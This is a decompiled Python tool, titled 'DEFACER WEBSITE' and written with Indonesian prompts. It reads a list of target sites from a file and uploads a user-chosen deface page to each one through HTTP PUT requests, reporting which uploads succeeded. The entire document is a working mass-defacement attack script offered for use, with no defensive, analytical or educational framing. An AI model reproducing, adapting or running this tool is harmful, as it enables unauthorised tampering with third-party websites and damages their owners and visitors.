# Decompiled By xNot_Found
# Github : https://github.com/hatakecnk
# uncompyle6 version 3.4.0
# Python bytecode 3.7
# Decompiled from: Python 3.7.4 (default, Jul 11 2019, 08:17:56) 
# [Clang 8.0.7 (https://android.googlesource.com/toolchain/clang b55f2d4ebfd35bf6
try:
    import requests, os.path, sys
except ImportError:
    exit('install requests dan coba lagi ...')

banner = '\n____               _____ ____  _    ____   _____ \n __ \\ \\        /   ___|   _ \\  |   |   \\    __ \\ \t\n |   |\\ \\  \\   /  \\___ \\  |   | |   |  _ \\   |   |\n |   | \\ \\  \\ /         | |   | |   | ___ \\  |   |\n____/   \\_/\\_/    _____/ \\__\\_\\___/_/    _\\____/  DEFACER WEBSITE\n'
b = '\x1b[31m'
h = '\x1b[32m'
m = '\x1b[00m'

def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)
    return str(ipt)


def aox(script, target_file='target.txt'):
    op = open(script, 'r').read()
    with open(target_file, 'r') as (target):
        target = target.readlines()
        s = requests.Session()
        print('uploading file to %d website' % len(target))
        for web in target:
            try:
                site = web.strip()
                if site.startswith('http://') is False:
                    site = 'http://' + site
                req = s.put((site + '/' + script), data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + '[' + b + ' F' + m + ' ] %s/%s' % (site, script))
                else:
                    print(m + '[' + h + ' berhasil' + m + ' ] %s/%s' % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x('Masukan nama sc deface yg ada di/sdcard: ')
            if not os.path.isfile(a):
                print("file '%s' not found" % a)
                continue
            else:
                break
        except KeyboardInterrupt:
            print
            exit()

    aox(a)


if __name__ == '__main__':
    main(banner)